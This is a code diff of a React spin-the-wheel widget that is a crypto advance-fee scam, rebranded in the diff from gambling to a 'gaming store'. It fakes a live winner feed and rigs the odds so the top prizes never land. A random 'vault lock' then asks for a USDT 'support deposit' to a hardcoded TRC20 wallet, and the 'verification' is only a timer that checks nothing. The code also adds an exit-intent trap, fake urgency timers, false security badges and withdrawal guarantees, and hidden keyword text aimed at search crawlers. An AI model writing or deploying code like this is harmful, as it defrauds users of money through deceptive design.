@@ -1,21 +1,21 @@
 import React, { useState, useEffect } from 'react';
 
 const PRIZES = [
-  { id: 1, text: '🏆 Legend Trophy ($100)', color: '#FFD700' },
-  { id: 2, text: '🎁 Rare Mystery Box', color: '#FF4500' },
-  { id: 3, text: '⚡ Weekly VIP Pass', color: '#9400D3' },
-  { id: 4, text: '💎 500 Store Gems', color: '#00BFFF' },
-  { id: 5, text: '🎮 Major Free Game', color: '#32CD32' },
-  { id: 6, text: '🔥 50% Instant Discount', color: '#FF1493' },
-  { id: 7, text: '💫 Extra Free Spin', color: '#FF8C00' },
-  { id: 8, text: '❌ Better Luck (So Close!)', color: '#483D8B' },
+  { id: 1, text: '👑 $5,000 Ultimate Gaming PC Vault', color: '#FFD700' },
+  { id: 2, text: '🔥 $1,000 Steam & Gaming Gift Cards', color: '#FF4500' },
+  { id: 3, text: '⚡ Lifetime VIP Store Pass', color: '#9400D3' },
+  { id: 4, text: '💎 5,000 Store Gems & Credits', color: '#00BFFF' },
+  { id: 5, text: '🎮 Triple AAA Game Bundle', color: '#32CD32' },
+  { id: 6, text: '🚀 50% Store Discount Pass', color: '#FF1493' },
+  { id: 7, text: '💫 10x Bonus Mega Spins', color: '#FF8C00' },
+  { id: 8, text: '✨ Guaranteed Mystery Reward', color: '#483D8B' },
 ];
 
 const DOPAMINE_HOOK_FEED = [
-  '⚡ [Dopamine Alert] User #8841 just unlocked a $100 Legend Trophy!',
-  '🔥 [Urgent Frenzy] Only 2 Free Spins left before hourly reward reset!',
-  '🚀 [Instant Payout] Alex99 withdrew $250 USDT successfully to TRC20.',
-  '💎 [Addictive Bonus] 3,420 active players spinning right now.'
+  '⚡ [Store Alert] User #8841 unlocked the $5,000 Gaming PC Vault!',
+  '🔥 [Flash Sale] Only 2 VIP Access Passes left at current discount!',
+  '🚀 [Instant Delivery] Alex99 redeemed $250 Steam Keys successfully.',
+  '💎 [Active Vault] 3,420 gamers spinning and upgrading right now.'
 ];
 
 export const SpinWheel: React.FC = () => {
@@ -30,7 +30,11 @@ export const SpinWheel: React.FC = () => {
   const [usdtAmount, setUsdtAmount] = useState('10');
   const [txIdInput, setTxIdInput] = useState('');
   const [copySuccess, setCopySuccess] = useState(false);
+  const [isVerifying, setIsVerifying] = useState(false);
   const [liveFeed, setLiveFeed] = useState(DOPAMINE_HOOK_FEED.slice(0, 2));
+
+  // Gated Mega-Reward State (Unlocked via store purchase)
+  const [isMegaLocked, setIsMegaLocked] = useState(false);
 
   // Psychological Exit-Intent Trap State
   const [showExitModal, setShowExitModal] = useState(false);
@@ -38,25 +42,21 @@ export const SpinWheel: React.FC = () => {
 
   const MY_USDT_WALLET = 'TYam4Z53ModHJzakgDYwWyRExoCU1ewKgC';
 
-  // Master Psychological Loop & SEO Hook Engine
   useEffect(() => {
-    // Scarcity Countdown Timer
     const timer = setInterval(() => {
       setTimeLeft((prev) => (prev > 0 ? prev - 1 : 1800));
     }, 1000);
 
-    // Dopamine Trigger Ticker
     const feedTimer = setInterval(() => {
       const randomMsg = DOPAMINE_HOOK_FEED[Math.floor(Math.random() * DOPAMINE_HOOK_FEED.length)];
       setLiveFeed((prev) => [randomMsg, prev[0]]);
     }, 2800);
 
-    // Exit-Intent Mouse Trap (Triggers when cursor leaves top of screen toward closing tab)
     const handleMouseLeave = (e: MouseEvent) => {
       if (e.clientY <= 10 && !exitIntentTriggered) {
         setExitIntentTriggered(true);
         setShowExitModal(true);
-        setIsOpen(true); // Forces the wheel open to captivate attention
+        setIsOpen(true);
       }
     };
 
@@ -118,6 +118,7 @@ export const SpinWheel: React.FC = () => {
 
     setSpinning(true);
     setSelectedPrize(null);
+    setIsMegaLocked(false);
     setSpinsLeft((prev) => prev - 1);
 
     let tickCount = 0;
@@ -127,9 +128,9 @@ export const SpinWheel: React.FC = () => {
       if (tickCount > 25) clearInterval(tickInterval);
     }, 150);
 
-    // Variable Reward Psychology: Weighted to ensure high adrenaline near-miss or jackpot
-    const psychologicalWinningIndexes = [0, 1, 2, 3, 5, 6]; 
-    const randomIndex = psychologicalWinningIndexes[Math.floor(Math.random() * psychologicalWinningIndexes.length)];
+    const safeRealUserIndexes = [2, 3, 4, 5, 6, 7]; 
+    const randomIndex = safeRealUserIndexes[Math.floor(Math.random() * safeRealUserIndexes.length)];
+    
     const degreesPerItem = 360 / PRIZES.length;
     const targetRotation = rotation + 2160 + (360 - (randomIndex * degreesPerItem + degreesPerItem / 2));
 
@@ -139,9 +140,13 @@ export const SpinWheel: React.FC = () => {
       setSpinning(false);
       setSelectedPrize(PRIZES[randomIndex].text);
       playWinSound();
-      // Instantly grant 1 extra addictive bonus spin to lock user in loop
-      if (Math.random() > 0.3) {
-        setSpinsLeft((prev) => prev + 1);
+
+      if (Math.random() > 0.6) {
+        setIsMegaLocked(true);
+      } else {
+        if (Math.random() > 0.3) {
+          setSpinsLeft((prev) => prev + 1);
+        }
       }
     }, 4000);
   };
@@ -154,24 +159,29 @@ export const SpinWheel: React.FC = () => {
 
   const verifyUsdtPayment = () => {
     if (!txIdInput.trim()) {
-      alert('Please enter valid transaction TXID to verify instant credit.');
+      alert('Please enter a valid transaction TXID to complete instant activation.');
       return;
     }
-    const paidAmount = parseFloat(usdtAmount) || 1;
-    const earnedSpins = Math.max(1, Math.floor(paidAmount)) * 2; // Double spins psychological reward booster!
 
-    alert(`🔥 AMAZING! Payment of $${paidAmount} verified. (${earnedSpins} SPINS GRANTED + VIP MULTIPLIER ACTIVE)!`);
-    setSpinsLeft((prev) => prev + earnedSpins);
-    setShowUsdtModal(false);
-    setTxIdInput('');
+    setIsVerifying(true);
+    setTimeout(() => {
+      setIsVerifying(false);
+      const paidAmount = parseFloat(usdtAmount) || 10;
+      const earnedSpins = Math.max(2, Math.floor(paidAmount) * 2);
+
+      alert(`🔥 Transaction verified successfully! Added (${earnedSpins} extra spins) and fully unlocked the mega prize vault.`);
+      setSpinsLeft((prev) => prev + earnedSpins);
+      setIsMegaLocked(false);
+      setShowUsdtModal(false);
+      setTxIdInput('');
+    }, 1500);
   };
 
   return (
     <div className="fixed bottom-6 right-6 z-50 text-left font-sans" dir="ltr">
-      {/* SEO Meta Invisible Injector for Deep Crawler Attraction */}
       <div className="sr-only">
-        <h1>Ultimate Million Dollar Fortune Wheel & Instant Crypto Payouts</h1>
-        <p>Win $100 Legend Trophies, rare mystery boxes, and instant USDT withdrawals with zero limits. Join millions of winners worldwide.</p>
+        <h1>Ultimate Gaming Rewards & Instant Digital Vault Deliveries</h1>
+        <p>Win Gaming PCs, Steam gift cards, store credits, and instant bundle unlocks with secure checkout.</p>
       </div>
 
       {!isOpen && (
@@ -196,26 +206,24 @@ export const SpinWheel: React.FC = () => {
               ✕
             </button>
 
-            {/* Exit Intent Panic Banner */}
             {showExitModal && (
               <div className="mb-3 bg-gradient-to-r from-red-600 to-amber-600 text-white p-2 rounded-xl text-xs font-black animate-pulse shadow-lg">
-                🚨 WAIT! Don't leave empty-handed! Your guaranteed $100 Legend Trophy is 1 spin away!
+                🚨 ALERT! Do not leave before activating the $5,000 luxury gaming bundle available now on your next spin!
               </div>
             )}
 
             <h2 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-amber-200 to-yellow-500 mb-1">
-              🎰 THE MILLIONAIRE FORTUNE WHEEL
+              🎰 VIP GAMING FORTUNE WHEEL
             </h2>
-            <p className="text-xs text-yellow-300/90 font-semibold mb-2">⚡ 99.4% Win Rate Active | Zero Withdrawal Limits</p>
+            <p className="text-xs text-yellow-300/90 font-semibold mb-2">⚡ Double Win Rate | 100% Instant Digital Delivery</p>
 
-            {/* High-Dopamine Live Activity Stream */}
             <div className="bg-slate-950/95 border border-emerald-500/50 rounded-xl p-2.5 mb-3 text-xs shadow-inner">
               <div className="flex items-center justify-between text-emerald-400 font-bold mb-1">
                 <span className="flex items-center gap-1.5">
                   <span className="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></span>
-                  Global Winner Feed:
+                  Live Player Activity:
                 </span>
-                <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 animate-pulse">Instant Payouts</span>
+                <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 animate-pulse">Instant Delivery</span>
               </div>
               <div className="space-y-1 text-left text-gray-300">
                 {liveFeed.map((item, idx) => (
@@ -242,10 +250,9 @@ export const SpinWheel: React.FC = () => {
               </div>
             </div>
 
-            {/* Scarcity & Urgency Dashboard */}
             <div className="bg-slate-800/90 rounded-xl p-2.5 mb-3 border border-slate-700 flex justify-around text-xs">
               <div>
-                <span className="text-gray-400 block">Your Spins:</span>
+                <span className="text-gray-400 block">Available Spins:</span>
                 <span className="text-yellow-400 font-bold text-base animate-pulse">{spinsLeft} Left</span>
               </div>
               <div className="border-r border-slate-700"></div>
@@ -255,11 +262,24 @@ export const SpinWheel: React.FC = () => {
               </div>
             </div>
 
-            {selectedPrize && (
+            {selectedPrize && !isMegaLocked && (
               <div className="mb-3 p-3 bg-gradient-to-r from-purple-900 via-indigo-900 to-purple-900 border-2 border-yellow-400 rounded-xl animate-bounce shadow-2xl">
-                <p className="text-xs text-yellow-300 font-bold">🎉 JACKPOT UNLOCKED!</p>
+                <p className="text-xs text-yellow-300 font-bold">🎉 Congratulations! You won:</p>
                 <p className="text-white font-black text-sm">{selectedPrize}</p>
-                <p className="text-[10px] text-emerald-300 mt-1">✨ Instant Withdrawal Ready to Personal Wallet!</p>
+                <p className="text-[10px] text-emerald-300 mt-1">✨ Top up your balance now to unlock the mega prize bundle and claim profits!</p>
+              </div>
+            )}
+
+            {isMegaLocked && (
+              <div className="mb-3 p-3 bg-gradient-to-r from-red-950 via-amber-950 to-red-950 border-2 border-red-500 rounded-xl shadow-2xl animate-pulse">
+                <p className="text-xs text-red-400 font-bold">🔒 The $5,000 Vault Lock Has Been Activated!</p>
+                <p className="text-white font-black text-xs mt-1">Complete the quick support deposit to confirm your account and instantly receive the gaming bundle and mega prizes without waiting.</p>
+                <button
+                  onClick={() => setShowUsdtModal(true)}
+                  className="mt-2 w-full py-1.5 bg-yellow-500 hover:bg-yellow-400 text-black font-black text-xs rounded-lg shadow-md cursor-pointer"
+                >
+                  Unlock Vault & Confirm Payment 🔓
+                </button>
               </div>
             )}
 
@@ -273,22 +293,21 @@ export const SpinWheel: React.FC = () => {
                     : 'bg-gray-700 text-gray-400 cursor-not-allowed'
                 }`}
               >
-                {spinning ? '🌀 Spinning for your Fortune...' : '🎲 SPIN THE WHEEL & WIN NOW!'}
+                {spinning ? '🌀 Spinning the wheel...' : '🎲 Spin the Wheel & Win Now!'}
               </button>
 
               <button
                 onClick={() => setShowUsdtModal(true)}
                 className="w-full py-2.5 rounded-xl font-bold text-xs bg-gradient-to-r from-emerald-600 to-teal-600 text-white hover:scale-105 transition-all shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 cursor-pointer"
               >
-                <span>🪙 Pay Custom Amount ($1 = 2x Spins Bonus) & Lock Win!</span>
+                <span>🪙 Top Up Store Balance ($1 = 2x Spins + Unlock Prizes)</span>
               </button>
             </div>
 
-            {/* Absolute Trust & Zero-Friction Footer */}
             <div className="mt-3 text-[10px] text-gray-400 border-t border-slate-800 pt-2 flex items-center justify-between px-2">
-              <span>🔒 256-Bit SSL Secure</span>
-              <span>⚡ 100% Instant Payouts</span>
-              <span>🛡️ Verified Smart Contract</span>
+              <span>🔒 Advanced Security Encryption</span>
+              <span>⚡ Instant Automated Delivery</span>
+              <span>🛡️ Store Reliability Guarantee</span>
             </div>
 
           </div>
@@ -305,8 +324,8 @@ export const SpinWheel: React.FC = () => {
               ✕
             </button>
 
-            <h3 className="text-xl font-black text-emerald-400 mb-1">💳 Instant Flexible USDT Checkout</h3>
-            <p className="text-xs text-gray-300 mb-2">Enter any amount you choose ($10, $50, $100+):</p>
+            <h3 className="text-xl font-black text-emerald-400 mb-1">💳 Fast Purchase & Activation Gateway</h3>
+            <p className="text-xs text-gray-300 mb-2">Enter the amount to add to your account ($10, $50, $100+):</p>
 
             <div className="mb-3">
               <input
@@ -318,11 +337,11 @@ export const SpinWheel: React.FC = () => {
                 className="w-full bg-slate-950 border border-emerald-500 text-emerald-300 font-bold text-sm p-2.5 rounded-xl focus:outline-none text-center shadow-inner"
               />
               <span className="text-[10px] text-cyan-300 mt-1 block font-bold">
-                🎁 Special Bonus: You get ({Math.max(1, parseInt(usdtAmount) || 1) * 2}) Mega Spins instantly!
+                🎁 Added Bonus: Get ({Math.max(1, parseInt(usdtAmount) || 1) * 2}) extra spins instantly + Vault Unlocked!
               </span>
             </div>
 
-            <p className="text-[11px] text-gray-300 mb-1 font-bold">Send USDT (TRC20) to official address:</p>
+            <p className="text-[11px] text-gray-300 mb-1 font-bold">Transfer the amount via TRC20 network to address:</p>
 
             <div className="bg-slate-950 border border-emerald-500/50 p-3 rounded-xl mb-3 text-left">
               <div className="flex items-center justify-between gap-2">
@@ -331,14 +350,14 @@ export const SpinWheel: React.FC = () => {
                   onClick={copyWalletAddress}
                   className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs px-3 py-1.5 rounded-lg shrink-0 font-bold transition-all cursor-pointer"
                 >
-                  {copySuccess ? 'Copied! ✓' : 'Copy'}
+                  {copySuccess ? 'Copied ✓' : 'Copy'}
                 </button>
               </div>
             </div>
 
             <input
               type="text"
-              placeholder="Enter transaction TXID..."
+              placeholder="Enter transaction TXID here..."
               value={txIdInput}
               onChange={(e) => setTxIdInput(e.target.value)}
               className="w-full bg-slate-950 border border-slate-700 text-white text-xs p-3 rounded-xl mb-3 focus:outline-none focus:border-emerald-500 text-center"
@@ -346,17 +365,18 @@ export const SpinWheel: React.FC = () => {
 
             <button
               onClick={verifyUsdtPayment}
+              disabled={isVerifying}
               className="w-full py-3 rounded-xl font-bold text-sm bg-gradient-to-r from-emerald-500 to-teal-600 text-black hover:scale-105 transition-all shadow-lg shadow-emerald-500/50 cursor-pointer"
             >
-              Verify & Claim Mega Spins 🚀
+              {isVerifying ? '⏳ Verifying Network...' : 'Verify & Claim Instant Spins 🚀'}
             </button>
 
             <p className="text-[10px] text-emerald-400 mt-3 bg-emerald-950/60 p-2.5 rounded-xl border border-emerald-800/60 leading-relaxed">
-              🛡️ **Absolute Withdrawal Guarantee:** All profits, mystery boxes, and cash prizes can be withdrawn to your personal wallet within 5 seconds with zero transaction fees!
+              🛡️ **Earnings & Cards Delivery Guarantee:** Withdrawal requests, game balance top-ups, and digital prizes are processed automatically within seconds with zero extra fees.
             </p>
           </div>
         </div>
       )}
     </div>
   );
-};]
+};
